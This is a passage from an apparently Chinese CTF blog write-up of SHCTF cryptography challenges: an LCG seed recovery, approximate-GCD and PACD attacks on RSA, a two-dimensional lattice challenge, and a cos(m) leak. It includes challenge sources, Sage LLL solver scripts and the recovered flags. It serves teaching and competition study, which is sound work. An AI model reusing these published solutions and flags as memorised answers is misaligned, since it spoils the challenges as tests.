class="built_in">len</span>(h)-<span class="number">1</span>):</span><br><span class="line">    A.append(a*A[i-<span class="number">1</span>] % m)</span><br><span class="line">    B.append((a*B[i-<span class="number">1</span>]+a*h[i]+b-h[i+<span class="number">1</span>]) % m)</span><br><span class="line">A = A[<span class="number">1</span>:]</span><br><span class="line">B = B[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">M = matrix(ZZ, <span class="number">4</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    M[i, i] = m</span><br><span class="line">    M[<span class="number">2</span>, i] = A[i]</span><br><span class="line">    M[<span class="number">3</span>, i] = B[i]</span><br><span class="line">    M[i, <span class="number">2</span>] = M[i, <span class="number">3</span>] = <span class="number">0</span></span><br><span class="line">M[<span class="number">2</span>, <span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">M[<span class="number">3</span>, <span class="number">3</span>] = <span class="number">2</span> ^ <span class="number">80</span></span><br><span class="line">M[<span class="number">2</span>, <span class="number">3</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(B)</span></span><br><span class="line">vl = M.LLL()[<span class="number">0</span>]</span><br><span class="line">l1 = vl[-<span class="number">2</span>]</span><br><span class="line">h1 = h[<span class="number">1</span>]</span><br><span class="line">s1 = l1+h1</span><br><span class="line"><span class="comment"># s1 = a*seed+b %m</span></span><br><span class="line">seed = ((s1 - b)*inverse(a, m)) % m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(seed)))</span><br></pre></td></tr></table></figure><h3 id="approximate_n"><a class="markdownIt-Anchor" href="#approximate_n"></a> Approximate_n</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">gen_AGCD</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enc_</span>(<span class="params">self,M,e</span>):</span><br><span class="line">        C = <span class="built_in">pow</span>(M,e,self.p*self.q)</span><br><span class="line">        <span class="keyword">return</span> C</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">re_n</span>(<span class="params">self</span>):</span><br><span class="line">        n = self.p * self.q</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">re_approximate_n</span>(<span class="params">self</span>):</span><br><span class="line">        k = getPrime(<span class="number">512</span>)</span><br><span class="line">        r = getPrime(<span class="number">247</span>)</span><br><span class="line">        n_approx = k*self.p + r</span><br><span class="line">        <span class="keyword">return</span> n_approx</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m1 = flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]</span><br><span class="line">    m2 = flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]</span><br><span class="line">    Encrypt1,Encrypt2 = gen_AGCD(),gen_AGCD()</span><br><span class="line">    C1,C2 = Encrypt1.enc_(bytes_to_long(m1),e),Encrypt2.enc_(bytes_to_long(m2),e)</span><br><span class="line">    N1,N2 = Encrypt1.re_n(),Encrypt2.re_n()</span><br><span class="line"></span><br><span class="line">    N1_reveal = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        N1_reveal.append(Encrypt1.re_approximate_n())</span><br><span class="line"></span><br><span class="line">    N2_reveal = Encrypt2.re_approximate_n()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;N1 = &#x27;</span>,N1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;N1_reveal = &#x27;</span>,N1_reveal)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;N2 = &#x27;</span>,N2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;N2_reveal = &#x27;</span>,N2_reveal)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;C1 = &#x27;</span>,C1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;C2 = &#x27;</span>,C2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N1 =  <span class="number">96502134442306766630190365969731828363778727883130269833831263030729382766871708955277488203412149574872944055023685615073160369667055165391139363670343365821984677896491807268232979350387954877922372950950780243682743844394991203320165732899685131283935792499892753451307642209809221822663392152288471021823</span></span><br><span class="line">N1_reveal =  [<span class="number">77705219796898349926839885901362391697193123906793097191996261575925849175407332321710792825082720557513850089322295414039681336092072254571699321375948951222317860652999589472915517507845841365274672577833665771086028602962109439527025487395716932924154350199931185780615439190044249004833761057553520523896</span>, <span class="number">101771374571903364376825329513075440461454871187484412108119869577359241962284106364327462518581295773967857497026500027588743941459732681237456599924841361897234722105593154233281857197289498137900009205262742274923791549949458533045513858988834611935292011332698825945015525702084909340922702830454016057656</span>, <span class="number">103308066020173388243939013455456792344591089380053927065657190729114972231966344486044059361082182275581440708206370313045480128023096558669938992589910297035965428513951908770936451635495065599156803750919438422441607375265723488664344874309433366167807148690522496265012027209017979164952732695326414177286</span>]</span><br><span class="line">N2 =  <span class="number">126314490047348725931925643488256867451387192778862769831444516788178825429992308851796360209421085412834951813258034674586637300071003126259472461902145059495863191644177296794378246004326313468778347471025921062822075416776435141753193055544252015777211515476648743598597767600732476604052602226710111917901</span></span><br><span class="line">N2_reveal =  <span class="number">121607959929347554767372194929261215875140159338098709002526312843338792449854249114170076517560920373007281830626375354007883051759222075792058099882652989084139135581276833151653103140568975782125656853212748288106091928722346823038787133815664193186644142101267277257773877912682435219235133596307742055012</span></span><br><span class="line">C1 =  <span class="number">44080512978184690656370058935616299003323581502051429639925401005903492935613231824147617079462256232777256986769059389320542984689091032347985854417804295290617849869674512129448623567972538299941390255754255527203708858792913070477546701933716837223866296707744004945466536539909767255265003029320832208959</span></span><br><span class="line">C2 =  <span class="number">46651595204851181126381212982309553404707491725272581862478471261361163016056856873672585451522975118618342388104186158854329857236927126394691443786101092805387307362778152096810494593230077268362452994690142423590119812564735744326958141171384070061244342460928080183425972281861566674325530530993856201985</span></span><br></pre></td></tr></table></figure><p>第一部分是<a href="https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/">AGCD</a>，这个按论文来就好，代码挺好写的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">N1 = <span class="number">96502134442306766630190365969731828363778727883130269833831263030729382766871708955277488203412149574872944055023685615073160369667055165391139363670343365821984677896491807268232979350387954877922372950950780243682743844394991203320165732899685131283935792499892753451307642209809221822663392152288471021823</span></span><br><span class="line">C1 = <span class="number">44080512978184690656370058935616299003323581502051429639925401005903492935613231824147617079462256232777256986769059389320542984689091032347985854417804295290617849869674512129448623567972538299941390255754255527203708858792913070477546701933716837223866296707744004945466536539909767255265003029320832208959</span></span><br><span class="line">N1_reveal = [<span class="number">77705219796898349926839885901362391697193123906793097191996261575925849175407332321710792825082720557513850089322295414039681336092072254571699321375948951222317860652999589472915517507845841365274672577833665771086028602962109439527025487395716932924154350199931185780615439190044249004833761057553520523896</span>, <span class="number">101771374571903364376825329513075440461454871187484412108119869577359241962284106364327462518581295773967857497026500027588743941459732681237456599924841361897234722105593154233281857197289498137900009205262742274923791549949458533045513858988834611935292011332698825945015525702084909340922702830454016057656</span>, <span class="number">103308066020173388243939013455456792344591089380053927065657190729114972231966344486044059361082182275581440708206370313045480128023096558669938992589910297035965428513951908770936451635495065599156803750919438422441607375265723488664344874309433366167807148690522496265012027209017979164952732695326414177286</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">mat = [[<span class="number">2</span> ^ <span class="number">248</span>, N1_reveal[<span class="number">1</span>], N1_reveal[<span class="number">2</span>]], [<span class="number">0</span>, -N1_reveal[<span class="number">0</span>], <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, -N1_reveal[<span class="number">0</span>]]]</span><br><span class="line">M = Matrix(ZZ, mat)</span><br><span class="line">k0 = <span class="built_in">abs</span>(M.LLL()[<span class="number">0</span>][<span class="number">0</span>]) // <span class="number">2</span> ^ <span class="number">248</span></span><br><span class="line">p = N1_reveal[<span class="number">0</span>] // k0</span><br><span class="line">q = N1 // p</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(C1, d, N1))).decode())</span><br><span class="line"><span class="comment"># SHCTF&#123;apProXlM4TE_N_H4</span></span><br></pre></td></tr></table></figure><p>第二部分更复杂一点，<strong>PACD问题</strong><br /><a href="https://tangcuxiaojikuai.xyz/post/4a67318c.html">糖醋小鸡块的高校密码挑战赛wp的1.12.12</a>，Orzzzzz</p><p><a href="https://mp.weixin.qq.com/s/dUcx4dYeURb24gkqB4iSYQ">官方wp</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve1</span>(<span class="params">N1_reveal</span>):</span><br><span class="line">    Len = <span class="built_in">len</span>(N1_reveal)</span><br><span class="line">    A = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(Len)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(Len)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Len):</span><br><span class="line">        A[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">2</span>**<span class="number">251</span></span><br><span class="line">        A[i][i] = -N1_reveal[<span class="number">0</span>]</span><br><span class="line">        A[<span class="number">0</span>][i] = N1_reveal[i]</span><br><span class="line"></span><br><span class="line">    A = matrix(ZZ, A)</span><br><span class="line">    A_solve = A.LLL()</span><br><span class="line"></span><br><span class="line">    k0 = <span class="built_in">abs</span>(A_solve[<span class="number">0</span>, <span class="number">0</span>]) // (<span class="number">2</span>**<span class="number">251</span>)</span><br><span class="line">    p = N1_reveal[<span class="number">0</span>] // k0</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve2</span>(<span class="params">N, N1, t, k, sys</span>):</span><br><span class="line">    var(<span class="string">&#x27;x y&#x27;</span>)</span><br><span class="line">    f = N1 - x</span><br><span class="line">    Q_polys = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(t + <span class="number">1</span>):</span><br><span class="line">        x1, x2, x3 = <span class="built_in">max</span>(k - j, <span class="number">0</span>), <span class="built_in">min</span>(j, k), <span class="built_in">max</span>(j - k, <span class="number">0</span>)</span><br><span class="line">        Q_polys.append(N**(x1) * f**(x2) * x**(x3))</span><br><span class="line"></span><br><span class="line">    len_Q = t + <span class="number">1</span></span><br><span class="line">    B = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Q_polys:</span><br><span class="line">        J = i.coefficients()</span><br><span class="line">        b = [<span class="number">0</span> * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(len_Q)]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> J:</span><br><span class="line">            b[j[<span class="number">1</span>]] = ZZ(j[<span class="number">0</span>]) * (<span class="number">2</span>**sys)**ZZ(j[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        B.append(b[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    B = matrix(QQ, B)</span><br><span class="line">    solve_B = B.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=== We have found the right B_LLL ===&#x27;</span>)</span><br><span class="line">    BB = solve_B[<span class="number">0</span>]</span><br><span class="line">    a = [BB[i] // ((<span class="number">2</span>**sys)**(t - i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_Q)]</span><br><span class="line">    </span><br><span class="line">    f1 = <span class="built_in">sum</span>(a[i] * x**(t - i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t + <span class="number">1</span>))</span><br><span class="line">    m = f1.roots(multiplicities=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># First part</span></span><br><span class="line">    N1 = <span class="number">152952981944000100965638860967602827566778521492487050491892827674361544670819337749785802004935917933682378674371592431931030006263550462078568397201797421799133055122247087592029620139237110046703705970063264710838333520122569715133956574555308030406142657069010739854876223563665391381467693316799077562631</span></span><br><span class="line">    N1_reveal = [</span><br><span class="line">        <span class="number">93468146961503699670349582663589460392367381003360753998849635467834109329797684521052329961180631916859515284206764142310372205159222106596242263153896728879084898629423535394124469773008692396830494914352138651073601861340964731819865482810779087666392285305203522266859409492705495993697069222798873726960</span>,</span><br><span class="line">        <span class="number">104236574927656394650569462832082413075782565853751822615159241825222661691226282897836986441960802720967958907731302400903695988149825216397968325252362370979139937478581483399525815281298614897697149261611978635688552921229950818270323755332455301763156318841119986217470444550142872582768290596482687744424</span>,</span><br><span class="line">        <span class="number">111344636205100432122150931949073552736191028277954358828475656601131912158613340112534257389822848254590508022360957981663909238892049647529257898438607265543877295425311970143364489439451122473266322338624662429675715687546673545518635013973444850954299112981470324421581526800664146117051212442370458976160</span></span><br><span class="line">    ]</span><br><span class="line">    N2 = <span class="number">161000399096301338674145679646803449371884584783717643268822418066620108407731540425248748533274852271981238626583833936952481982310960867551626932936647644974305095312215770087022986994903359281662387821626872045714904933693788625089056417708989083541828993779459498763207176730305258351465296844035402992037</span></span><br><span class="line">    N2_reveal = <span class="number">94357561554041679026592892471969668587647998642633209852151089525750487249954579819289811636051497958155667305620006329556344469501081714147153506848627046878474589251168180372471471342863289188504937739676178745002243329722947845252016138510055976215692978579052562147323290563188038148717392659754084259868</span></span><br><span class="line">    C1 = <span class="number">58594793302586275577689791690916913430813466918408684969682636302311071900226219937673437452062598539194973815823691328343903675454727770424091510402364067928727276503529768938503877868193223803409389316480107820270032654504227476928880926262835555278965327337517905481056020439215084989992384844952072797767</span></span><br><span class="line">    C2 = <span class="number">96355602042990531636996233678782492485176551414647666201694738677085382408306061625779061776073653265708098763914371044105367860146561867196601390320646644981522466233466082942467352765311760481386653836121412702539810520173452171910779083525937819154456189707020401497882337846898520990299400500600590240447</span></span><br><span class="line">    </span><br><span class="line">    p0 = solve1(N1_reveal)</span><br><span class="line">    q0 = N1 // p0</span><br><span class="line">    phi0 = (p0 - <span class="number">1</span>) * (q0 - <span class="number">1</span>)</span><br><span class="line">    d0 = inverse(<span class="built_in">int</span>(e), <span class="built_in">int</span>(phi0))</span><br><span class="line">    flag1 = long_to_bytes(<span class="built_in">pow</span>(<span class="built_in">int</span>(C1), <span class="built_in">int</span>(d0), <span class="built_in">int</span>(N1)))</span><br><span class="line">    <span class="built_in">print</span>(flag1)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Second part</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    r_solve = solve2(N2, N2_reveal, <span class="number">32</span>, <span class="number">16</span>, <span class="number">247</span>)[<span class="number">0</span>]</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;The consumption of time is:&#x27;</span>, end - start)</span><br><span class="line">    </span><br><span class="line">    p1 = GCD(<span class="built_in">int</span>(N2), <span class="built_in">int</span>(N2_reveal - r_solve))</span><br><span class="line">    q1 = N2 // p1</span><br><span class="line">    phi1 = (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>)</span><br><span class="line">    d1 = inverse(<span class="built_in">int</span>(e), <span class="built_in">int</span>(phi1))</span><br><span class="line">    flag2 = long_to_bytes(<span class="built_in">pow</span>(<span class="built_in">int</span>(C2), <span class="built_in">int</span>(d1), <span class="built_in">int</span>(N2)))</span><br><span class="line">    </span><br><span class="line">    flag = flag1 + flag2</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;SHCTF&#123;aPPr0XlmATE_n_Ha&#x27;</span></span><br><span class="line"><span class="string">=== We have found the right B_LLL ===</span></span><br><span class="line"><span class="string">[127990506151602747223338072930951429851562684252303322353834484627148943881]</span></span><br><span class="line"><span class="string">The consumption of time is: 21.33029294013977</span></span><br><span class="line"><span class="string">b&#x27;SHCTF&#123;aPPr0XlmATE_n_HaPPy_thE_nEw_gG4G_Z_2F&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="lattice"><a class="markdownIt-Anchor" href="#lattice"></a> Lattice</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n = getPrime(<span class="number">1024</span>)</span><br><span class="line">x = getPrime(<span class="number">200</span>)</span><br><span class="line">hint = (x*gmpy2.invert(m,n)) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;hint = <span class="subst">&#123;hint&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 145848130693758117543412571487372860506913235602516809974808585818522269136564650276188615818190323186398953857101908968758176245420927884552132860870716227938682446515612285455042030232618089765452507888912611184083526823439265617219381992067586404368454945188603041053893851526230640924307097690926185151461</span></span><br><span class="line"><span class="string">hint = 5320062530050244856400971682135383371777368095215566601290251095974038808423579214623058814514827385162275539682781206812688885576283033343821681589154704394235000387503484688642086179809749262851140803203040860523361516855245641425935013688442339456695107400868547828586043122364556477095674662788145610351</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>简单的格，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mi>k</mi><mo>∗</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo>∗</mo><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">x=k*n+m*hint</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>k</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∗</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>n</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext> </mtext><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>x</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\left [ \begin{matrix}k&amp;m\\\end{matrix} \right ]*\left [ \begin{matrix}n&amp;0\\hint&amp;1\\\end{matrix} \right ]\ =\left [ \begin{matrix}x&amp;m\\\end{matrix} \right ]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">145848130693758117543412571487372860506913235602516809974808585818522269136564650276188615818190323186398953857101908968758176245420927884552132860870716227938682446515612285455042030232618089765452507888912611184083526823439265617219381992067586404368454945188603041053893851526230640924307097690926185151461</span></span><br><span class="line">hint = <span class="number">5320062530050244856400971682135383371777368095215566601290251095974038808423579214623058814514827385162275539682781206812688885576283033343821681589154704394235000387503484688642086179809749262851140803203040860523361516855245641425935013688442339456695107400868547828586043122364556477095674662788145610351</span></span><br><span class="line">mat = [[n, <span class="number">0</span>], [hint, <span class="number">1</span>]]</span><br><span class="line">M = Matrix(ZZ, mat)</span><br><span class="line">x, m = M.LLL()[<span class="number">0</span>]</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="大学高中"><a class="markdownIt-Anchor" href="#大学高中"></a> 大学×高中√</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">47</span></span><br><span class="line">leak = cos(m).n(<span class="number">1000</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"><span class="comment"># 0.930663173858708735013864574261632487708466528608503618563619854272677238694112204757817175383567864768566170130001514302467697072153084760545849543698249360760783987526742296036337216144968878436793442305949050751417113202760217838648422727760945579644861599148512584771382319668482598215317149996430</span></span><br></pre></td></tr></table></figure><p>这里我们知道的是<code>cos(m)</code>的前1000位，则根据反三角函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>a</mi><mi>r</mi><mi>c</mi><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo stretchy="false">)</mo><mo>+</mo><mn>2</mn><mi>k</mi><mi>π</mi></mrow><annotation encoding="application/x-tex">m=arccos(leak)+2k\pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord 